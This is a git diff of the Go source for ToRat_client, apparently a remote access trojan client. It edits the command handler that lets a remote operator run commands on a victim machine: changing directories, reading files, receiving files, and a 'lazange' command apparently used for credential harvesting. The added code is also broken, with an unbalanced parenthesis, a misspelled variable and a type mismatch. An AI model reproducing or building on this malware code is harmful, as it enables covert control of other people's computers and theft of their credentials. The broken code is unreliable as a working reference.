@@ -8,7 +8,7 @@ import (
 	"runtime"
 	"strings"
 
-	"github.com/lu4p/ToRat_client/cat"
+	"github.com/lu4p/cat"
 	"github.com/lu4p/ToRat_client/crypto"
 	"github.com/lu4p/ToRat_client/screen"
 	"github.com/lu4p/ToRat_client/shred"
@@ -45,8 +45,7 @@ func (c *connection) shell() {
 			out = false
 			c.recvFile(cmdsp[1])
 		case "cd":
-			fname := strings.Split(cmd, " ")[1]
-			err := os.Chdir(fname)
+			err := os.Chdir(cmdsp[1])
 			if err != nil {
 				output = []byte("Could not Change Directory")
 			} else {
@@ -63,8 +62,12 @@ func (c *connection) shell() {
 		case "ping":
 			output = []byte("pong")
 		case "cat":
-			output = []byte(cat.Cat(cmdsp[1]))
-
+			txt, err := cat.Cat(cmdsp[1]))
+			if err != nil {
+				ouput = "Something went wrong could not get txt!"
+			} else {
+				output = []byte(txt)
+			}
 		case "reconnect":
 			break
 		case "lazange":
@@ -86,7 +89,6 @@ func (c *connection) shell() {
 			} else {
 				output = []byte(path)
 			}
-
 		case "ls":
 			files, err := filepath.Glob("*")
 			if err != nil {
